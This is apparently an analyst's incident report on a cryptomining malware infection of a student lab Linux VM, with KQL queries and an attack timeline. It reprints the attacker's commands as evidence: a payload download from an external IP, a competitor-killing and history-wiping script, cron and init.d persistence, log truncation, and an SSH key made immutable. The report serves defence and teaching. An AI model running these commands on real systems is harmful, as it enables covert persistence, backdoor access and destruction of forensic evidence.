# Linux Miner Infection  

---

## Report Information

**Analyst:** Justin Soflin  
**Date Completed:** Feb. 04, 2026  
**Environment:** Cyber Range at LOG(N) Pacific  

**Hosts Investigated:**
- linux-programmatic-fix-michael  
- linuxprogrammaticpabon  

**User Context:** root | Unauthorized miner installation & persistence  

**Tools & Data Sources:**
- Microsoft Defender for Endpoint  
- Log Analytics Workspaces  
- KQL  
- Linux audit logs  

**Scope:**
- SYSTEM-level execution  
- Persistence analysis  
- Malware delivery chain reconstruction  
- Log tampering assessment  

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Investigation](#investigation)
  - [Initial Detection: Malware or PUA Observed](#initial-detection-malware-or-pua-observed)
  - [Authentication Context and Lab Configuration](#authentication-context-and-lab-configuration)
  - [Malicious Binary Download Detected](#malicious-binary-download-detected)
  - [Multiple Download Methods Observed](#multiple-download-methods-observed)
  - [Binary Relocation and Renaming](#binary-relocation-and-renaming)
  - [Persistence via /etc/init.d](#persistence-via-etcinitd)
  - [Log Tampering via cat /dev/null](#log-tampering-via-cat-devnull)
  - [SSH Key Implantation](#ssh-key-implantation)
  - [Malware Validation and Classification](#malware-validation-and-classification)
- [Recommended Actions](#recommended-actions)
- [Conclusion](#conclusion)

---

## Executive Summary

The student Linux virtual machine `linux-programmatic-fix-michael` was compromised by an automated cryptocurrency mining malware campaign. The investigation was initiated following a Microsoft Defender for Endpoint alert indicating **Malware or  PUA (Potentially Unwanted Application) Observed**.

This incident occurred during an active **student lab exercise** in which the **root account password was intentionally set to `root`** to generate alerts during Tenable vulnerability scanning exercises. While expected in a controlled instructional environment, this configuration significantly weakened the system’s security posture and exposed the VM to real-world internet scanning and brute-force activity.

Telemetry confirms that an external actor successfully authenticated as `root`, downloaded and executed a malicious ELF binary, established persistence using legacy init scripts, renamed system utilities to evade detection, implanted SSH keys for long-term access, and deliberately destroyed forensic artifacts.

VirusTotal analysis of the recovered binary returned a **46 / 63 detection score**, classifying the file as a **Trojan**, confirming the activity was malicious and not the result of student experimentation or administrative automation.

---

## Investigation

### Initial Detection: Malware or PUA Observed

- MDE generates alert **Malware or PUA** activity on Linux host
- Alert correlated with suspicious processes occurring under `root`

<Br>

<img width="1280" height="648" alt="image" src="https://github.com/user-attachments/assets/23305203-e6f9-4434-918b-dd3c6c2dceb1" />

<br>

- MDE mapped a lengthy Process Tree, highlighting several suspicious processes:
   - Suspicious file dropped and launched
   - Suspicious shell command execution
   - Suspicious file or content ingress
   - Executable permission added to file or directory
   - Suspicious shell script launched
- Along with many suspicious commands observed:
   - `wget` (Remote file download)
   - `curl` (Payload retrieval / C2 communication)
   - `chmod` (Permission modification for execution)
   - `cron` (Persistence via scheduled task, Linux scheduler)
   - `dash` (Lightweight shell used to execute scripts)
 
     <Br>

<img width="1280" height="646" alt="image" src="https://github.com/user-attachments/assets/030f8102-196a-40a7-86d7-a291bb89e4e5" />

<br>
  
---

### First Look Into Compromised Device

- multiple reconiassance commands observed:
   - `la -la` Lists files/directories, including hidden ones (-a) with permissions (-l)
   - `who` Shows logged-in users
   - `cat /etc/resolv.conf` reads contents of /resolv.conf, typically contains DNS resolver configuration
   - `uptime` Displays how long the system has been running, number of users, load averages
   - `cd /etc` hanges the working directory to /etc

  <Br>
  
```kql
DeviceProcessEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated desc
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, InitiatingProcessParentFileName, ProcessCommandLine
```

<img width="1144" height="326" alt="image" src="https://github.com/user-attachments/assets/d4180bbb-a5bd-4228-849a-da6448cde0a9" />

<br>

- What this means:
   - A persistent root-level session existed for ~5 days
   - That session repeatedly executed _estimated thousands of_ short-lived binaries
   - Filenames were randomized: `owqtmtieus`, `nwvslhwzwf`, etc.
   - Execution counts were throttled per binary
   - Activity pattern indicates automation, not human typing
   - Behavior is inconsistent with legitimate admin activity

<img width="1184" height="470" alt="image" src="https://github.com/user-attachments/assets/5deb645c-ed6c-4d8c-bbab-548841fd69e9" />

- Session ID `79416`
   - Value is derived from Linux and added by MDE
   - Correlates sessions to file name randomization
   - Logs show **over 15,000** commands linking to the same session for this VM
   - All originating from the same ParentFile `ygljglkjgfg0`
   - Each command is within milliseconds of each other

```
Linux kernel:  creates session 79416
        ↓
MDE sensor:   observes + labels it
        ↓
Log Analytics: stores & exposes it
```

---

### Authentication Context and Lab Configuration

At the time of compromise, the VM was actively being used for a **student lab exercise** designed to trigger insecure authentication practices for Tenable scans.

Lab configuration included:
- SSH access intentionally exposed  
- **Root password set to `root`**  
- Expected vulnerability generation in Tenable for followup remediation

<img width="764" height="212" alt="image" src="https://github.com/user-attachments/assets/88779564-9ad3-4531-9fcd-cd627f7525d0" />

<Br>

- Students are instructed to destroy VM asap when lab is finished

<br>

---

### Student changes Root password | AHTKzAEv

- Student begins the lab, changing root password to 'root'
   - `2026-01-30T13:50:32.826013Z` — `/etc/shadow` edited by _Labuser_ via root (likely a password change)
   - `2026-01-30T14:02:04.257228Z` ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created

Within minutes, `AHTKzAEv` and its siblings appear in `/var/tmp` or `/usr/bin` with gibberish names, running as root processes.

```kql
DeviceFileEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated asc
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<br>

<img width="1103" height="283" alt="image" src="https://github.com/user-attachments/assets/6ac566a0-a285-4a43-b403-a1ee36c917fc" />

<Br>

- File lifecycle after creation:
   - 2:02:04 — `AHTKzAEv` and multiple `x.sh` files created, initial payload and helper scripts
   - 2:02:04.957 — `retea` in `/dev/shm` created
   - `/dev/shm` is shared memory. malware sometimes drops helpers here for fast execution or stealth (RAM-only execution)
   - 2:02:05 — `/root/.ssh/authorized_keys` updated. Allows persistence via SSH (attacker can log in without a password)
   - 2:02:05 — `/etc/passwd` and `/etc/shadow` updated. Confirms the attacker escalated privileges / added backdoors, possibly adding a new root password
- Repeated FileCreated / FileDeleted events for x.sh and AHTKzAEv
   - This pattern suggests execution loops: run the script → collect data → delete temporary files → drop new scripts to continue
   - Deleting files is often to avoid forensic detection
   - 
```
/var/tmp/AHTKzAEv          <- the malicious binary
  └─ ygljglkjgfg0          <- child process / script spawned by AHTKzAEv
       └─ owqtmtieus       <- reconnaissance or mining scripts spawned by ygljglkjgfg0

```

<img width="1035" height="393" alt="image" src="https://github.com/user-attachments/assets/dcc3a47c-84ca-4431-81ed-79a4bed88857" />

<br>

### Malware Injects Password Hash for Root

**Command:** usermod -p ********** root
   - `usermod` → Linux command used to modify a user account
   - `-p **********` → Sets the user’s password hash directly (not plaintext)
   - `root` → The username being modified

- ********** is the masked hash, so you don’t see it
- By replacing or adding a root hash with its own, malware creates a backdoor
- Student is still able to log in/won't get booted off
- 
 <Br>

 <img width="1151" height="344" alt="image" src="https://github.com/user-attachments/assets/58e42a90-b7db-41a8-b939-cc96f061c592" />

<br>

- This takes place just 12 minutes after student's password change
- Student wouldn't have had ample time to complete lab before device is compromised

- <br>

<img width="788" height="386" alt="image" src="https://github.com/user-attachments/assets/7adfaba9-8836-42cf-a495-8014fff03e91" />

<br>

---

### diicot

- `kuak` and `diicot` created in _tmp_ folder shortly after `AHTKzAEv`
   - both files ran long code meant to terminate any existing miners
<img width="1174" height="342" alt="image" src="https://github.com/user-attachments/assets/2161b4c2-df21-4a20-ba11-47370b34a5cc" />

<br>
<br>

**Full command with annotations**
```bash
# --- Cleanup old folders & recreate working directory ---
rm -rf /var/tmp/Documents /tmp/cache             # Remove old malware staging directories and temp files
mkdir -p /var/tmp/Documents 2>&1                 # Recreate working directory

# --- Remove cron jobs & SSH keys for stealth/control ---
crontab -r                                       # Remove all user cron jobs
chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1   # Remove immutable flags from SSH keys (so they can delete/replace)

# --- Prep malware files ---
cd /var/tmp
chattr -iae /var/tmp/Documents/.diicot          # Remove immutable flags from previously staged .diicot
mv /var/tmp/diicot /var/tmp/Documents/.diicot  # Move new diicot payload to working dir
mv /var/tmp/kuak /var/tmp/Documents/kuak        # Move kuak shared library to working dir

# --- Kill competing miners or Java apps ---
pkill Opera
pkill cnrig
pkill java
killall java
pkill xmrig
killall cnrig
killall xmrig

# --- Make all files in working dir executable ---
cd /var/tmp/Documents
chmod +x .*                                     # Recursive executable flags
./.diicot >/dev/null 2>&1 & disown             # Run diicot in background silently

# --- Cleanup shell history for stealth ---
history -c
rm -rf .bash_history ~/.bash_history

# --- Prepare & execute cache payload ---
cd /tmp/
chmod +x cache
./cache >/dev/null 2>&1 & disown
history -c
rm -rf .bash_history ~/.bash_history
```

- What this script is doing:
   - Terminating any potential competing malware/miners to free up CPU/resources
   - Setting up its working directory
   - Moving payload files into a hidden location
   - Making them executable
   - Running them in the background
   - Wiping evidence
 
<br>

**SOURCE: DarkTrace blog** <Br>
<img width="643" height="583" alt="image" src="https://github.com/user-attachments/assets/d775f701-74fa-44bf-bda9-2ca113e9ff3b" /> <br>

<br>

### Root Cron Persistence

<br>

- `cron` is a built-in Linux utility for scheduling tasks
   - these cron processes start at: `2026-01-30T14:04:23.447447Z`
   - and go on until: `2026-02-02T22:47:03.418251Z`
- these Cron tasks run _every minute_
- cron drops `.b4nd1d0` into `/var/tmp/`
- Executes hidden payload
- Rewrites cron to ensure it stays installed
- This illustrates post-compromise persistence

<img width="1175" height="342" alt="image" src="https://github.com/user-attachments/assets/42f58afa-b9c0-4b16-a493-319739ba0942" /> <br>

<br>

- many _tmp._ files in `/var/spool/cron/crontabs/` (like `tmp.RYF9JE` and `tmp.SHGiEW`) along with root crontab activity
- These are temporary cron files created when the malware manipulates the root crontab
- crontab writes to temp files first, then rename them into place
   - That explains the frequent FileCreated + FileRenamed events — the malware is adding a scheduled job

     <br>
     
### .b4nd1d0 
- a _leetspeak_ spelling of "Bandito"
- Known Malware Associations
   - .b4nd1d0 has been observed in real Linux malware families in the wild
   - It’s typically a secondary payload, backdoor, or helper binary
   - Its consistent naming makes it easier for the malware’s cron/systemd scripts to find and execute it repeatedly

 <br>
 
<img width="1175" height="343" alt="image" src="https://github.com/user-attachments/assets/27adc996-b56a-4990-8b6d-688639596920" />

<br>

### Malicious Binary Download p.txt

- curl http://**IP ADDRESS**/p.txt -o ygljglkjgfg0
   - `p.txt` malicious ELF binary
   - `ygljglkjgfg0` renamed executable copy
 
    <br>
   
<img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />

<br> 

- malicious file output to `ygljglkjgfg0`
   - Downloaded via `curl` and `wget` from a remote host `23.160.56.194/p.txt`
   - First seen at `/usr/bin/ygljglkjgfg0` = persistent executable
   - Then copied to `/etc/init.d/ygljglkjgfg0` = run at boot
   - and `/etc/cron.hourly/gcc.sh` = run every hour or as scheduled
 
    <Br>

<img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />
  
- `ygljglkjgfg0` is the original parent file to spawn the many randomized file names from the start
  - EX. `tdrbhhtkky`, `omicykvmml`
  - obfuscated names evade detection/break continuity in logs
- These are clones or secondary payloads:
   - Backdoors
   - Miner binaries
   - Remote control scripts
 
   <br>

<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />

<Br>

- **Crontab modification**
- The malware edits `/etc/crontab` to remove old references to `gcc.sh` and add a new entry:
   - `*/3 * * * * root /etc/cron.hourly/gcc.sh`
   - malware will now run every 3 minutes

   <br>
   
---

<br>

### p.txt SHA256 Hashes
<br>

- p.txt observations:
   - downloaded on two different devices
   - from same IP `23.160.56.194`
   - to the same file name `ygljglkjgfg`
   - on 1/27 and 2/2
   - both with the same file size `548616`
   - but with two different SHA256
 
<br>

<img width="1185" height="111" alt="image" src="https://github.com/user-attachments/assets/34ab995b-7b97-4eb8-9bc6-5828c76611c3" />

<br>
  
- Keep the same URL so all infected machines keep pulling the “latest version”
- FileType: Elf (Executable and Linkable Format) even though it's named .txt
   - Not actually a text file, but a compiled Linux binary
   - Name file .txt to avoid suspicion
   - Download → Rename → Execute

 **VirusTotal page for both SHA256 Hashes**    
<img width="1280" height="647" alt="image" src="https://github.com/user-attachments/assets/987eede9-ed10-45ce-b751-6016c6f32762" /> <br>

<img width="1280" height="644" alt="image" src="https://github.com/user-attachments/assets/37e734b4-a72d-4f33-ac52-817bbc5ea215" />

 <br>
 
- **Observed behaviors from VirusTotal:**  
  - Cryptocurrency mining  
  - Process termination of competing miners  
  - Persistence installation  
  - Log destruction  

<br>




---

### Binary Relocation and Renaming

The attacker deliberately renamed trusted system binaries:

mv /usr/bin/wget /usr/bin/good  
mv /bin/wget /bin/good  

Renaming trusted utilities allows continued payload delivery while bypassing simplistic detections that rely on binary names.

---

### Persistence via /etc/init.d

Persistence was established by creating an init script:

```kql
DeviceFileEvents  
| where DeviceName == "linux-programmatic-fix-michael"  
| where FolderPath startswith "/etc/init.d"  
| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine  
| order by TimeGenerated desc  
```

Why this is significant:

- `/etc/init.d` scripts execute automatically on boot  
- Execution occurs as `root`  
- Persistence survives reboots and user logouts  

This confirms **intentional long-term persistence**.

---

### Log Tampering via cat /dev/null

The attacker deliberately destroyed forensic evidence by truncating multiple logs:

cat /dev/null >/root/.bash_history  
cat /dev/null >/var/log/wtmp  
cat /dev/null >/var/log/btmp  
cat /dev/null >/var/log/lastlog  
cat /dev/null >/var/log/secure  
cat /dev/null >/var/log/syslog  

Because these logs were cleared on the host, historical entries no longer existed for ingestion into Log Analytics, significantly limiting post-incident visibility.

---

### SSH Key Implantation

A persistent SSH backdoor was implanted:

chattr -ia ~/.ssh/authorized_keys  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > ~/.ssh/authorized_keys  
chattr +ai ~/.ssh/authorized_keys  

Setting the immutable attribute (`+i`) prevents easy removal and ensures continued access even if credentials are rotated

---

## Recommended Actions

### Immediate Recovery

- Redeploy affected virtual machines  
- Remove unauthorized init scripts  
- Rotate all credentials and SSH keys  
- Rebuild systems from trusted images  

### Monitoring Improvements

- Alert on writes to `/etc/init.d`  
- Monitor renaming of binaries in `/bin` and `/usr/bin`  
- Detect log truncation behavior  
- Alert on modifications to `authorized_keys`  
- Flag repeated download attempts from single external IPs  

---

## Conclusion

This incident represents a **complete Linux system compromise** performed by automated malware exploiting weak authentication during a student lab exercise. While the insecure configuration was intentional for instructional purposes, it created conditions identical to real-world attack surfaces.

Microsoft Defender for Endpoint successfully detected the malicious activity, enabling investigation and confirmation of compromise. This case highlights how quickly exposed Linux systems can be compromised and reinforces the importance of monitoring persistence mechanisms, binary integrity, and log tampering — even in educational or non-production environments.


## Misc

109.206.236.18
Beaconing = the infected machine initiating an outbound connection to an attacker-controlled server.



- Cyber Range environment was previously targeted by malware, specifically linked to this lab
- as we will soon see, this VM was compromised 12 minutes after password was updated
